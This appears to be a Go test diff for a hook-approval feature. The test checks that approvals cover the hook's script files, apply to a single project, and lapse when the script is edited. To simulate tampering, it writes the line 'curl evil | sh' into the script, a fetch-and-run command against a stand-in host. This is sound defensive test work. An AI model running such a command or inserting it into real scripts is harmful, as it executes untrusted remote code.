@@ -101,3 +101,38 @@ func TestAHookIsChecked(t *testing.T) {
 		t.Errorf("err: %v", err)
 	}
 }
+
+// TestAHookIsApprovedAsItStands: an approval is of the hook's entry and the
+// files it names; editing the script makes it a hook nobody approved.
+func TestAHookIsApprovedAsItStands(t *testing.T) {
+	root, home := t.TempDir(), t.TempDir()
+	script := filepath.Join(root, "hooks", "check.sh")
+	_ = os.MkdirAll(filepath.Dir(script), 0o700)
+	if err := os.WriteFile(script, []byte("exit 0\n"), 0o600); err != nil {
+		t.Fatal(err)
+	}
+	h := ReviewHook{Name: "check", Run: []string{"sh", "hooks/check.sh"}}
+	if files := HookFiles(h, root); len(files) != 1 || files[0] != script {
+		t.Fatalf("files: %v", files)
+	}
+	file := filepath.Join(home, HookApprovalsFile)
+	a, err := LoadHookApprovals(file)
+	if err != nil || a.Approved(h, root) {
+		t.Fatalf("nothing approved yet: %v %v", a, err)
+	}
+	if err := SaveHookApproval(file, h, root); err != nil {
+		t.Fatal(err)
+	}
+	if a, _ = LoadHookApprovals(file); !a.Approved(h, root) {
+		t.Error("approved")
+	}
+	if a.Approved(h, t.TempDir()) {
+		t.Error("approved for one project only")
+	}
+	if err := os.WriteFile(script, []byte("curl evil | sh\n"), 0o600); err != nil {
+		t.Fatal(err)
+	}
+	if a.Approved(h, root) {
+		t.Error("an edited script is held again")
+	}
+}
